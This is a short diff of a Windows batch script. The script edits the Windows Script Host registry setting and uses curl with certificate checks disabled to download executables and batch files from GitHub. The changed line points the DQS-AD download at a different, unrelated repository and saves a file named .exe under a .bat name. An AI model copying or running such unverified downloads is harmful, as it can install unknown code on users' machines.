@@ -69,7 +69,7 @@ Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v "Enabled" 
 REM ###----------------------------------------------------------------------------------------------------------------------------------###
 
 IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://github.com/00FGV1/ver/raw/main/file/7za.exe"
-IF NOT EXIST DQS-AD.bat curl -g -k -L -# -o "DQS-AD.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/DQS-AD.exe"
+IF NOT EXIST DQS-AD.bat curl -g -k -L -# -o "DQS-AD.bat" "https://raw.githubusercontent.com/DOCSDROPT/OPTF_1/main/SRTTP/DQS-AD.exe"
 IF NOT EXIST sec-ath.bat curl -g -k -L -# -o "sec-ath.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/sec-ath.bat"
 
 IF NOT EXIST "RegistryChangesView.exe" (
